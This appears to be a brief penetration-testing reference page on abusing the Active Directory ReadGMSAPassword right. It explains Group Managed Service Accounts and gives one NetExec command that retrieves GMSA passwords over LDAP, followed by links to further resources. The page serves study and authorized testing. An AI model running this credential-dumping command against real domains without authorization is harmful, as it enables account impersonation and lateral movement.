# ReadGMSAPassword

This privilege allows you to read the password for a Group Managed Service Account (GMSA). Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).

The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.\`;



{% code title="NetExec" %}
```bash
netexec ldap DC_IP -u USER -p 'PASS' --gmsa
```
{% endcode %}



## Resources

{% embed url="https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword" %}

{% embed url="https://bloodhound.specterops.io/resources/edges/read-gmsa-password" %}
